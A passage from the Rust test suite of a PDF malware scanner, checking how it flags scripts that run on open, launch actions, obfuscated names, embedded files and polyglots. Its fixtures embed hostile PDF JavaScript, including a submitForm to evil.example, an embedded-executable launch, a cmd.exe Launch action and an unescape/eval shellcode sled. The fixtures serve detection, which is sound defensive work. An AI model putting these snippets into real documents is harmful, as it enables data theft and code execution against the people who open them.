            ("this.submitForm({cURL: \"https://evil.example/c\"})", "sends form data"),
            ("this.exportDataObject({cName: \"a.exe\", nLaunch: 2})", "writes an embedded file"),
            ("app['mailMsg'](true)", "sends mail"),
            ("util.printf(\"%45000f\", 1)", "util.printf"),
            ("Collab.collectEmailInfo({subj: \"\", msg: \"x\"})", "Collab"),
        ] {
            let pdf = format!(
                "%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS ({script}) >> >> endobj\n%%EOF"
            );
            let got = scan_bytes("a.pdf", pdf.as_bytes());
            assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{script}: {got:?}");
            assert!(got[0].note.contains(why), "{script}: {}", got[0].note);
            assert!(got[0].note.contains(&format!("`{}", &script[..20])), "quoted: {}", got[0].note);
        }
        // A decoder over a long escaped payload is a shellcode sled.
        let sled = format!(
            "%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (var p = unescape(\"{}\"); eval(p);) >> >> endobj\n%%EOF",
            "%u4141".repeat(20)
        );
        let got = scan_bytes("a.pdf", sled.as_bytes());
        assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
        assert!(got[0].note.contains("decodes a long escaped payload"), "{}", got[0].note);
        assert!(got[0].note.ends_with("…`"), "a long line is cut: {}", got[0].note);
        let short = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (eval(\"1+1\")) >> >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", short)), [("DOC-JAVASCRIPT", false)], "eval over nothing much");
        // Scripts off the open path warn as before, with the first quoted.
        let js_only = b"%PDF-1.7\n1 0 obj << /Type /Annot /A << /S /JavaScript /JS (calc()) >> >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", js_only);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)]);
        assert!(got[0].note.ends_with("the first reads `calc()`"), "{}", got[0].note);
        // A fillable worksheet: field scripts and a go-to-page open action. Not on open.
        let form = b"%PDF-1.6\n1 0 obj << /Type /Catalog /OpenAction 3 0 R /AcroForm 4 0 R >> endobj\n3 0 obj << /S /GoTo /D [5 0 R /Fit] >> endobj\n6 0 obj << /FT /Tx /AA << /F << /S /JavaScript /JS (AFNumber_Format(2)) >> /K << /S /JavaScript /JS (AFNumber_Keystroke(2)) >> >> >> endobj\n%%EOF";
        let got = scan_bytes("worksheet.pdf", form);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(got[0].note.contains("doesn't run it"), "{}", got[0].note);
        assert!(got[0].note.contains("`AFNumber_Format(2)`"), "{}", got[0].note);
    }

    #[test]
    fn document_level_scripts_are_read_through_the_name_tree() {
        // this.print() in the names tree, by reference: inside the document.
        let tree = b"%PDF-1.6\n1 0 obj << /Type /Catalog /Names << /JavaScript 7 0 R >> /OpenAction 3 0 R >> endobj\n7 0 obj << /Names [(init) 8 0 R] >> endobj\n8 0 obj << /S /JavaScript /JS (this.print()) >> endobj\n%%EOF";
        let got = scan_bytes("tree.pdf", tree);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(got[0].note.contains("`this.print()`"), "{}", got[0].note);
        // One level of /Kids, and an open action by reference, both reaching out.
        let kids = b"%PDF-1.6\n1 0 obj << /Type /Catalog /Names << /JavaScript 7 0 R >> >> endobj\n7 0 obj << /Kids [6 0 R] >> endobj\n6 0 obj << /Names [(a) 8 0 R] >> endobj\n8 0 obj << /S /JavaScript /JS (this.getURL(\"https://x.y/\")) >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("kids.pdf", kids)), [("DOC-JS-ON-OPEN", true)]);
        let by_ref = b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 12 0 R >> endobj\n2 0 obj << /S /GoTo >> endobj\n12 0 obj << /S /JavaScript /JS (app.openDoc(\"x.pdf\")) >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("ref.pdf", by_ref)), [("DOC-JS-ON-OPEN", true)], "an open action by reference");
        // TCPDF's empty names-tree entry does nothing, so it is nothing.
        let empty = b"%PDF-1.7\n1 0 obj << /Type /Catalog /Names << /JavaScript 9 0 R >> >> endobj\n9 0 obj << /Names [(EmbeddedJS) 10 0 R] >> endobj\n10 0 obj << /S /JavaScript /JS () >> endobj\n%%EOF";
        assert!(scan_bytes("invoice.pdf", empty).is_empty());
        // ...unless other scripts were left unread.
        let mut with_fields = empty[..empty.len() - 5].to_vec();
        with_fields.extend_from_slice(
            b"11 0 obj << /FT /Tx /AA << /F << /S /JavaScript /JS (AFNumber_Format(2)) >> >> >> endobj\n%%EOF",
        );
        let got = scan_bytes("form.pdf", &with_fields);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(got[0].note.contains("is empty, and 1 other /JS reference(s)"), "{}", got[0].note);
        // A script that can't be read is not a script that is fine.
        let missing = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS 99 0 R >> >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", missing);
        assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
        assert!(got[0].note.contains("could not be read"), "{}", got[0].note);
        let lzw = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS 9 0 R >> >> endobj\n9 0 obj << /Length 3 /Filter /LZWDecode >> stream\nabc\nendstream\nendobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", lzw)), [("DOC-JS-ON-OPEN", true)]);
        let no_tree = b"%PDF-1.7\n1 0 obj << /Type /Catalog /Names << /JavaScript 7 0 R >> >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", no_tree)), [("DOC-JS-ON-OPEN", true)], "a tree that isn't there");
    }

    #[test]
    fn functions_defined_at_open_run_from_links_not_at_open() {
        // KiCad as it writes it: an inline name tree, and a pop-up menu whose
        // "http" entries launch a URL when the reader picks one. The reader's
        // choice, not the file's: a warning that says so.
        let kicad = b"%PDF-1.5\n1 0 obj << /Type /Catalog /Names 4 0 R >> endobj\n4 0 obj\n<< /JavaScript\n << /Names\n    [ (JSInit) << /Type /Action /S /JavaScript /JS (\nfunction ShM\\(aEntries\\) {\n    var aParams = [];\n    for \\(var i in aEntries\\) {\n        aParams.push\\({ cName: aEntries[i][0], cReturn: aEntries[i][1] }\\)\n    }\n    var cChoice = app.popUpMenuEx.apply\\(app, aParams\\);\n    if \\(cChoice != null && cChoice.substring\\(0, 1\\) == '#'\\) this.pageNum = parseInt\\(cChoice.slice\\(1\\)\\);\n    else if \\(cChoice != null && cChoice.substring\\(0, 4\\) == 'http'\\) app.launchURL\\(cChoice\\);\n}\n) >> ]\n >>\n>>\nendobj\n5 0 obj << /Type /Annot /Subtype /Link /A << /Type /Action /S /JavaScript /JS (ShM\\([[\"Reference = R1\"]]\\);) >> >> endobj\n%%EOF";
        let got = scan_bytes("schematic.pdf", kicad);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(got[0].note.contains("only defines functions for links and fields to call; ShM() opens a URL (app.launchURL) when called: `function ShM(aEntries) {`"), "{}", got[0].note);
        // The same function with a page-open action that calls it: that runs at open.
        let mut called = kicad[..kicad.len() - 5].to_vec();
        called.extend_from_slice(b"6 0 obj << /Type /Page /AA << /O << /S /JavaScript /JS (ShM([[\"x\", \"http://evil.example/\"]])) >> >> >> endobj\n%%EOF");
        let got = scan_bytes("schematic.pdf", &called);
        assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
        assert!(got[0].note.contains("calls ShM(), defined at open, which opens a URL"), "{}", got[0].note);
        // A page-open action that reaches out on its own.
        let page_open = b"%PDF-1.7\n1 0 obj << /Type /Page /AA << /O << /S /JavaScript /JS (this.submitForm(\"https://x.y/\")) >> /C << /S /JavaScript /JS (app.alert(2)) >> >> >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", page_open)), [("DOC-JS-ON-OPEN", true)]);
        let page_close = b"%PDF-1.7\n1 0 obj << /Type /Page /AA << /C << /S /JavaScript /JS (this.submitForm(\"https://x.y/\")) >> >> >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", page_close)), [("DOC-JAVASCRIPT", false)], "a close action is an event");
        // Defining and calling in one script is running it.
        let runs = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (function go(u) { app.launchURL(u); } go(\"http://evil.example/\");) >> >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", runs)), [("DOC-JS-ON-OPEN", true)]);
        assert_eq!(defined_functions("function a(){} function b(x){ if(x){ } }"), Some(vec!["a".into(), "b".into()]));
        assert_eq!(defined_functions("function a(){ var s = \"}\"; /* } */ } // }\n"), Some(vec!["a".into()]));
        assert_eq!(defined_functions("function a(){}; a();"), None);
        assert_eq!(defined_functions("var x = 1; function a(){}"), None);
        assert_eq!(defined_functions("function a(){"), None, "unbalanced");
        assert_eq!(defined_functions("functionX(){}"), None);
        // TCPDF as it writes it: a bare object number for the tree and a UTF-16
        // byte-order mark with nothing after it. Nothing.
        let tcpdf = b"%PDF-1.7\n15 0 obj\n<<\n/Names [(EmbeddedJS) 16 0 R ]\n>>\nendobj\n16 0 obj\n<<\n/S /JavaScript\n/JS (\xfe\xff)\n>>\nendobj\n19 0 obj\n<< /Type /Catalog /Names << /JavaScript 15 >> /OpenAction [6 0 R /XYZ null null 0.6] >>\nendobj\n%%EOF";
        assert!(scan_bytes("invoice.pdf", tcpdf).is_empty(), "{:?}", scan_bytes("invoice.pdf", tcpdf));
    }

    #[test]
    fn scripts_come_as_streams_hex_and_utf16() {
        // KiCad's component-property pop-ups: a zlib-wrapped FlateDecode stream by
        // reference from a names-tree entry. Inside the document: a warning, quoted.
        let shm: [u8; 133] = [
            0x78, 0xda, 0x55, 0xcc, 0xcd, 0x0a, 0xc2, 0x30, 0x10, 0x04, 0xe0, 0x57, 0x99, 0x63, 0x0a, 0x25, 0xe8, 0xd5,
            0xe2, 0xb1, 0xc7, 0x8a, 0x58, 0x3c, 0x85, 0x1c, 0x96, 0x90, 0xd2, 0x80, 0xdd, 0x84, 0xfc, 0x88, 0x52, 0xfa,
            0xee, 0xb6, 0xa0, 0xa2, 0x97, 0x85, 0x99, 0xf9, 0xd8, 0xa1, 0xb0, 0xc9, 0xce, 0x33, 0xfa, 0xb1, 0x13, 0xd4,
            0x72, 0x8e, 0xce, 0xa6, 0x0a, 0x33, 0xee, 0x14, 0x41, 0x67, 0x8a, 0x34, 0x25, 0x1c, 0xa1, 0x74, 0x83, 0xc1,
            0x47, 0x88, 0xad, 0x76, 0x70, 0x8c, 0x5f, 0xfb, 0x76, 0x32, 0x94, 0x34, 0x8a, 0xd9, 0x9c, 0x68, 0xb2, 0x87,
            0x2f, 0x50, 0x4e, 0xab, 0x9d, 0xae, 0x61, 0x2e, 0x36, 0x97, 0xc8, 0xff, 0xc3, 0x5e, 0x2f, 0x55, 0x83, 0x05,
            0x14, 0x82, 0x0c, 0x3e, 0x5c, 0x43, 0x67, 0xb9, 0xb4, 0x0f, 0xb9, 0xe6, 0xdb, 0x53, 0xac, 0xb7, 0xfe, 0x3c,
            0xdf, 0xd8, 0x0b, 0x5a, 0xec, 0x3c, 0x13,
        ];
        let mut kicad = b"%PDF-1.5\n1 0 obj << /Type /Catalog /Names << /JavaScript 7 0 R >> >> endobj\n7 0 obj << /Names [(EmbeddedJS) 8 0 R] >> endobj\n8 0 obj << /S /JavaScript /JS 9 0 R >> endobj\n9 0 obj << /Length 133 /Filter /FlateDecode >> stream\n".to_vec();
        kicad.extend_from_slice(&shm);
        kicad.extend_from_slice(b"\nendstream\nendobj\n%%EOF");
        let got = scan_bytes("schematic.pdf", &kicad);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(
            got[0].note.contains("`function ShM(aEntries) { var aParams = []; for (var i in aEntries)"),
            "{}",
            got[0].note
        );
        assert_eq!(
            inflate_stream(&shm, 1 << 10).map(|v| v.len()),
            Some(173),
            "the zlib header is stripped; raw DEFLATE still reads"
        );
        assert_eq!(inflate_stream(&shm[2..], 1 << 10).map(|v| v.len()), Some(173));
        // A stream with no filter is read as it is.
        let plain = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS 9 0 R >> >> endobj\n9 0 obj << /Length 11 >> stream\nthis.print()\nendstream\nendobj\n%%EOF";
        let got = scan_bytes("a.pdf", plain);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(got[0].note.contains("`this.print()`"), "{}", got[0].note);
        // Hex strings, UTF-16 with a byte-order mark, and literal escapes all decode.
        let hex = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS <FEFF0074006800690073002E007000720069006E00740028002900 3B> >> >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", hex);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(got[0].note.contains("`this.print();`"), "{}", got[0].note);
        let escaped = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert\\(\"hi \\(there\\)\"\\);\\n// line two) >> >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", escaped);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(got[0].note.contains("`app.alert(\"hi (there)\");`"), "{}", got[0].note);
        assert_eq!(literal_string(b"(a\\101\\n\\t)"), b"aA\n\t");
        assert_eq!(hex_string(b"<48 65 6C6C6F7>"), b"Hello\x70");
        assert_eq!(text_of(&[0xFF, 0xFE, b'h', 0, b'i', 0]), "hi");
        assert_eq!(quote("\n\n  var  x = 1;\nnext"), "var x = 1;");
        assert_eq!(quote(&"y".repeat(100)).chars().count(), QUOTE_LEN + 1);
        assert!(
            is_reference(b"12 0 R>>") && !is_reference(b"12 0 Rx") && !is_reference(b"12") && !is_reference(b"(x)")
        );
    }

    #[test]
    fn launch_and_escaped_names_fail() {
        let launch = b"%PDF-1.7\n1 0 obj << /S /Launch /F (cmd.exe) >> endobj\n%%EOF";
        assert_eq!(ids(&scan_bytes("a.pdf", launch)), [("DOC-LAUNCH", true)]);
        let escaped = b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >> endobj\n2 0 obj << /S /J#61vaScript /J#53 (x) >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", escaped);
        assert!(ids(&got).contains(&("DOC-OBFUSCATED", true)), "{got:?}");
        assert!(
            ids(&got).contains(&("DOC-JAVASCRIPT", false)),
            "decoded names still count, through the reference, and `x` does nothing on its own: {got:?}"
        );
        let harmless = b"%PDF-1.7\n1 0 obj << /T#79pe /Catalog >> endobj\n%%EOF";
        assert!(scan_bytes("a.pdf", harmless).is_empty(), "an escape in a name that does nothing");
    }

    #[test]
    fn embedded_files_forms_and_trailers_warn() {
        // Acrobat Distiller's job options ride along in its PDFs: named, so the reader can judge.
        let embedded = b"%PDF-1.7\n1 0 obj << /Type /Filespec /F (EI.joboptions) /UF (EI.joboptions) /EF << /F 2 0 R >> >> endobj\n2 0 obj << /Type /EmbeddedFile >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", embedded);
        assert_eq!(ids(&got), [("DOC-EMBEDDED", false)]);
        assert_eq!(got[0].note, "1 embedded file(s) (EI.joboptions): a PDF carrying another file");
        // The Unicode name wins over the byte one, and comes as UTF-16 hex.
        let unicode = b"%PDF-1.7\n1 0 obj << /Type /Filespec /F (r_sum_.pdf) /UF <FEFF007200E900730075006D00E9002E007000640066> /EF << /F 2 0 R >> >> endobj\n2 0 obj << /Type /EmbeddedFile >> endobj\n3 0 obj << /Type /Filespec /F (payload.exe) /EF << /F 4 0 R >> >> endobj\n4 0 obj << /Type /EmbeddedFile >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", unicode);
        assert!(got[0].note.starts_with("2 embedded file(s) (résumé.pdf, payload.exe)"), "{}", got[0].note);
        let nameless = b"%PDF-1.7\n1 0 obj << /Type /Filespec /EF << /F 2 0 R >> >> endobj\n2 0 obj << /Type /EmbeddedFile >> endobj\n%%EOF";
        assert!(scan_bytes("a.pdf", nameless)[0].note.contains("(name not found)"));
        let form = b"%PDF-1.7\n1 0 obj << /AcroForm << /XFA 2 0 R >> >> endobj\n3 0 obj << /S /SubmitForm /F (https://x.y) >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", form);
        assert_eq!(ids(&got), [("DOC-FORM", false)]);
        assert!(got[0].note.contains("an XFA form, a submit"), "{}", got[0].note);
        let mut trailer = b"%PDF-1.4\n%%EOF\n".to_vec();
        trailer.extend(std::iter::repeat_n(b'x', 5000));
        assert_eq!(ids(&scan_bytes("a.pdf", &trailer)), [("DOC-TRAILER", false)]);
    }

    #[test]
    fn a_pdf_without_the_header_is_a_polyglot() {
        let html = b"<html><body>not a pdf</body></html>\n";
        let got = scan_bytes("report.pdf", html);
        assert_eq!(ids(&got), [("DOC-POLYGLOT", true)]);
        assert!(got[0].note.contains("markup"), "{}", got[0].note);
        let got = scan_bytes("report.pdf", b"PK\x03\x04\x14\x00");
        assert!(got[0].note.contains("a zip archive"), "{}", got[0].note);
        let got = scan_bytes("report.pdf", b"{\\rtf1\\ansi}");
        assert!(got[0].note.contains("an RTF document"), "{}", got[0].note);
        let got = scan_bytes("report.pdf", &[0u8, 1, 2, 3, 4, 5]);
        assert!(got[0].note.contains("something else"), "{}", got[0].note);
    }

    #[test]
    fn names_count_outside_stream_data_and_inside_object_streams() {
        assert_eq!(count_names(b"/JS /JScript /JS", b"/JS"), 2);
        // Random bytes inside a compressed stream don't count (an arXiv paper
        // spelled `/JS` by chance); the same names in an inflated object stream do.
        let binary = b"%PDF-1.4\n1 0 obj << /Length 40 /Filter /FlateDecode >> stream\n\x00\xffIP/JS\x16\x10xx/AA\x01 /OpenAction /Launch\nendstream\nendobj\n%%EOF";
        assert!(scan_bytes("paper.pdf", binary).is_empty());
        // The catalog lives in a compressed object stream: `/Names << /JavaScript 3 0 R >>`.
        let mut objstm =
            b"%PDF-1.5\n5 0 obj << /Type /ObjStm /N 2 /First 8 /Filter /FlateDecode /Length 94 >> stream\n".to_vec();
        objstm.extend_from_slice(&[
            0x33, 0x54, 0x30, 0x50, 0x30, 0x52, 0x30, 0x33, 0x50, 0xb0, 0xb1, 0x51, 0xd0, 0x0f, 0xa9, 0x2c, 0x48, 0x55,
            0xd0, 0x77, 0x4e, 0x2c, 0x49, 0xcc, 0xc9, 0x4f, 0x57, 0xd0, 0xf7, 0x4b, 0xcc, 0x4d, 0x2d, 0x06, 0x4b, 0x78,
            0x25, 0x96, 0x25, 0x06, 0x27, 0x17, 0x65, 0x16, 0x94, 0x28, 0x18, 0x03, 0x35, 0x04, 0x29, 0xd8, 0xd9, 0x29,
            0xe8, 0xfb, 0x17, 0xa4, 0xe6, 0x39, 0x26, 0x97, 0x64, 0xe6, 0xe7, 0x01, 0x4d, 0x80, 0x0a, 0x82, 0x14, 0x07,
            0x2b, 0xe8, 0xbb, 0xe7, 0x87, 0xe4, 0x2b, 0xe8, 0xbb, 0x28, 0x44, 0x9b, 0x82, 0x25, 0xf4, 0xdd, 0x32, 0x4b,
            0x62, 0x81, 0xd2, 0x00,
        ]);
        objstm.extend_from_slice(b"\nendstream\nendobj\n%%EOF");
        let got = scan_bytes("hidden.pdf", &objstm);
        assert_eq!(ids(&got), [("DOC-JS-ON-OPEN", true)], "{got:?}");
        assert!(got[0].note.contains("object stream(s) inflated"), "{}", got[0].note);
        // "endstream" inside text is text, not a stream start.
        let stray = text_outside_streams(b"a endstream b");
        assert_eq!(stray, b"a endstream b");
    }

    #[test]
    fn decode_names_undoes_hex_escapes_and_remembers_which_mattered() {
        let (decoded, escaped) = decode_names(b"<< /J#61vaScript /Pa#67es /J#53 (x) >>");
        assert_eq!(decoded, b"<< /JavaScript /Pages /JS (x) >>");
        assert_eq!(escaped, ["/JavaScript", "/JS"], "the names that do things, once each, not /Pages");
        let (decoded, escaped) = decode_names(b"/JS#20x");
        assert_eq!(decoded, b"/JS x", "a decoded byte stays part of the name");
        assert!(escaped.is_empty(), "so `/JS x` is not `/JS`");
        let (decoded, escaped) = decode_names(b"/Plain /A#zz");
        assert_eq!(decoded, b"/Plain /A#zz", "a # without two hex digits is left alone");
        assert!(escaped.is_empty());
    }
}
